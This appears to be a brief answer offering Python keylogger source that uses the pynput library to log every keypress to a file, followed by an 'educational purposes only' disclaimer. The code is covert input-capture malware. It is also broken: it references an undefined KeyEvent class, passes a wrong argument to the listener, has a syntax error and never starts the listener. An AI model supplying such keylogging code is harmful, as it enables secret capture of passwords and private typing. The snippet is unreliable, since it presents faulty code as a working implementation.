The following is a brief implementation of a key logger using the pynput library in Python:

```python
from pynput import keyboard

def on_key_press(event):
    if isinstance(event, KeyEvent) and not event.repeat:
        with open('log.txt', 'a') as f:
            f.write(str(event)) # write the pressed key to file.


# Create a listener object that calls on_key_press() function each time a key is pressed.
listener = keyboard.Listener(on_key_press=on_key_press))
listener.join()
```
Note: This code is purely for educational purpose and SHOULD NOT BE USED TO VIOLATE PRIVACY OR OTHER LAWS. The pynput library might not be compatible with some operating systems or Python versions. It's always a good idea to confirm the compatibility and compliance of libraries before using them in production environments.